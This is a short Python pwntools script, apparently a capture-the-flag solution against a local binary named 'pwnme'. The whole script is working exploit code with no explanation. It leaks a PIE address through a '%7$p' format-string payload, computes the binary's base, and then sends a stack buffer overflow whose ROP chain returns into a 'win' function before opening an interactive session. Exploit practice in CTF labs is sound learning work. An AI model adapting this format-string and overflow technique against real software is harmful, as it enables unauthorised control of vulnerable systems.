from pwn import *
import re
p=process("./pwnme")
elf=ELF("./pwnme")
resp1=p.recvrepeat(.1)
print(resp1)
p.sendline(b"%7$p")
resp=p.recvrepeat(.1)
leak = int(re.findall(b"[0-9a-f]{8,16}",resp)[0],16)
print(hex(leak))
elf.address = leak - elf.sym._start
p.sendline(b"A"*0x20 + b"JUNKJUNK" + p64(elf.address + 0x1353) + p64(0xdeadbeef) + p64(elf.address + 0x101a) + p64(elf.sym.win))
p.interactive()
